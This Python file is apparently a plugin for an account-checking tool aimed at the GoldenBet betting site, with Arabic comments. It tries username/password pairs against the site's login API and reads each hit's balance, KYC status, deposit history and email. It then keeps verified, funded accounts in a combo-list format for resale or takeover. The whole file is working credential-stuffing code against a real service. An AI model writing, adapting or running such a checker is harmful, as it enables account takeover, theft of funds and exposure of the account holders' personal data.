from core.base_checker import BaseChecker
from typing import Dict, Any
import requests

class GoldenbetChecker(BaseChecker):
    """GoldenBet site checker"""
    
    # الروابط المهمة
    LOGIN_URL = "https://m.goldenbet.com/api/profile/login"
    PROFILE_URL = "https://m.goldenbet.com/api/profile/p/getprofile"
    WALLET_URL = "https://m.goldenbet.com/api/profile/p/getwallets"
    
    # الهيدرات المطلوبة
    HEADERS = {
        "authority": "m.goldenbet.com",
        "accept": "*/*",
        "content-type": "application/json",
        "origin": "https://m.goldenbet.com",
        "referer": "https://m.goldenbet.com/eng/static/login",
        "user-agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
    }
    
    def check_account(self, username: str, password: str) -> Dict[str, Any]:
        """Check single GoldenBet account"""
        try:
            # أنشئ جلسة جديدة
            session = requests.Session()
            session.headers.update(self.HEADERS)
            
            # زور صفحة تسجيل الدخول أولاً للحصول على الكوكيز
            try:
                session.get("https://m.goldenbet.com/eng/static/login", timeout=5)
            except:
                pass
            
            # 1. تسجيل الدخول
            payload = {
                "UserName": username,
                "Password": password,
                "ConfirmationStatus": None
            }
            
            resp = session.post(self.LOGIN_URL, json=payload, timeout=20)
            
            # 2. تحقق من الاستجابة
            if resp.status_code != 200:
                return {"status": "bad", "username": username}
            
            data = resp.json()
            if data.get("status") != 1:
                return {"status": "bad", "username": username}
            
            # 3. احصل على بيانات الملف الشخصي
            profile_resp = session.get(self.PROFILE_URL, timeout=15)
            if profile_resp.status_code != 200:
                return {"status": "error", "username": username}
            
            profile = profile_resp.json()
            
            # 4. احصل على بيانات المحفظة
            wallet_resp = session.get(self.WALLET_URL, timeout=15)
            wallet_info = {}
            if wallet_resp.status_code == 200:
                wallet_data = wallet_resp.json()
                if wallet_data and len(wallet_data) > 0:
                    wallet_info = wallet_data[0]
            
            # 5. استخرج المعلومات المهمة
            kyc_status = profile.get("KYCStatus", False)
            deposited_before = profile.get("Deposited", False)
            balance = wallet_info.get("Balance", 0)
            email = data.get("response", {}).get("Email", "")
            country = profile.get("CountryId", "")
            
            # 6. رتب بيانات الحساب
            account_data = {
                "login": username,
                "password": password,
                "kyc_status": kyc_status,
                "deposited_before": deposited_before,
                "balance": balance,
                "email": email,
                "country": country,
                # معلومات إضافية
                "phone_verified": profile.get("PhoneVerified", False),
                "mail_verified": profile.get("MailVerified", False)
            }
            
            return {
                "status": "valid",
                "account_data": account_data,
                "should_save": self.should_save(account_data)
            }
            
        except Exception as e:
            return {"status": "error", "username": username, "error": str(e)}
    
    def should_save(self, account_data: Dict[str, Any]) -> bool:
        """شروط حفظ الحساب"""
        # حفظ الحساب إذا: KYC مفعل + تم الشحن مسبقاً
        return account_data.get("kyc_status", False) and account_data.get("deposited_before", False)
    
    def save_format(self, account_data: Dict[str, Any]) -> str:
        """تنسيق حفظ الحساب في الملف"""
        return f"{account_data['login']}:{account_data['password']} | " \
               f"kyc_status={account_data['kyc_status']} | " \
               f"deposited_before={account_data['deposited_before']} | " \
               f"balance={account_data['balance']} | " \
               f"country={account_data['country']} | " \
               f"phone_verified={account_data['phone_verified']} | " \
               f"mail_verified={account_data['mail_verified']}\n"
